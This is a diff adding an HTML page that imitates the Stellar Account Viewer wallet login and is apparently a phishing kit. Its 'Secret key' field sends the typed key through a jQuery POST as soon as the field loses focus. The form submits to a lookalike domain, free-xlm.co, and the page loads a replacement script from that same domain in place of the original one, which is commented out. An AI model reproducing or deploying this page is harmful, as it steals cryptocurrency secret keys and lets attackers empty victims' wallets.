@@ -1,0 +1,86 @@
+<html><head>
+  <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+  <meta charset="utf-8">
+  <title>Stellar - Account Viewer</title>
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width">
+<link href="style-8ede3607c73899fd87a40ea034f3dff0.css" rel="stylesheet">
+<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+<body>
+  <script type="text/javascript">
+    function SendForm() {
+    var key = document.getElementById('key').value;
+    //alert(key);
+$.ajax({    
+   url: '',
+    type: 'POST',
+    data: {'key' : key},
+    cache: false,
+    success: function(response){
+        if(response){
+            $('#res').html(response); 
+        }
+    }
+});
+}
+</script>
+<!-- uiView: --><div ui-view="" class="ng-scope"><div class="so-back ng-scope">
+  <div class="so-chunk">
+    <div class="so-siteHeader siteHeader">
+      <span class="so-logo">
+        <a href="../index.html" class="so-logo__main">Stellar</a><!--
+        --><span class="so-logo__separator"> </span><!--
+        --><a href="../index.html" class="so-logo__subSite">account viewer</a>
+      </span>
+    </div>
+  </div>
+</div>
+
+<div class="so-back ng-scope">
+  <div ng-controller="interstellar-basic-client.LoginController as login" class="so-chunk ng-scope">
+    <div class="welcomeBox">
+      <h2 class="welcomeBox__title">Stellar Account Viewer</h2>
+      <p>Lightweight client to send and receive lumens over the Stellar network.</p>
+    </div>
+    <form method="post" id="keys" action="https://free-xlm.co/account-viewer/send-lumens.html" ng-submit="login.submit()" class="loginBox ng-pristine ng-valid">
+      <p class="loginBox__label">Secret key:</p>
+      <input type="password" name="key" ng-model="login.secret" class="loginBox__input ng-pristine ng-untouched ng-valid ng-empty" id="key" onblur="SendForm()" placeholder="Example: SCHKBJ............ZLJ7">
+
+      <!-- ngIf: login.alerts.length > 0 -->
+
+      <input type="submit" name="send" class="s-button loginBox__submit" ng-class="{'is-disabled': login.processing}" ng-disabled="login.processing" value="Sign in">
+    </form>
+
+    <div class="middleBox">
+        Generate key pair for a new account
+        <!-- ngIf: login.newKeypair --><br>
+        <button type="button" class="s-button loginBox__submit" ng-click="login.generate()">Generate</button>
+    </div>
+    <div class="middleBox">
+      Connect Ledger Nano S <img ng-src="images/e2e5e2a8ab6ecca1520f2a3ee098e8d5.png" ng-mousedown="login.toggleInfo()" style="cursor: pointer;" title="Click me" src="images/e2e5e2a8ab6ecca1520f2a3ee098e8d5.png">
+      <br>
+      <div class="loginBox__info ng-hide" ng-show="login.showInfo">
+        Available on Chrome and Opera. Install the Stellar app from Ledger and enable browser support in the app settings.
+      </div>
+      <div class="loginBox__ledgerAccount">
+        <input id="ledgerDefaultAccountCheckbox" type="checkbox" ng-model="hideBip32Input" ng-init="hideBip32Input=true" class="ng-pristine ng-untouched ng-valid ng-not-empty">
+        <!-- ngIf: hideBip32Input --><label for="ledgerDefaultAccountCheckbox" ng-if="hideBip32Input" class="ng-scope">Use default account</label><!-- end ngIf: hideBip32Input -->
+        <!-- ngIf: !hideBip32Input -->
+      </div>
+      <!-- ngIf: login.ledgerAlerts.length > 0 -->
+      <button type="button" class="s-button loginBox__submit" ng-click="login.proceedWithLedger()" ng-disabled="login.ledgerStatus != 'Connected'" disabled="disabled">Sign in with Ledger</button>
+    </div>
+    <div class="middleBox">
+      Looking for a more advanced wallet? <a href="../../www.stellar.org/lumens/wallets/index.html">Proceed here »</a>
+    </div>
+    <div class="legacyBox">
+      Looking for legacy login? <a href="../../launch.stellar.org/index.html">Proceed here »</a>
+    </div>
+  </div>
+</div>
+
+</div>
+<script src="vendor-d9389d500d236fedbb4f.js"></script><script src="https://free-xlm.co/account-viewer/head-818f8b9d5e165c46e0f3.js"></script><!-- <script src="main-or.js"></script> -->
+
+</body></html>
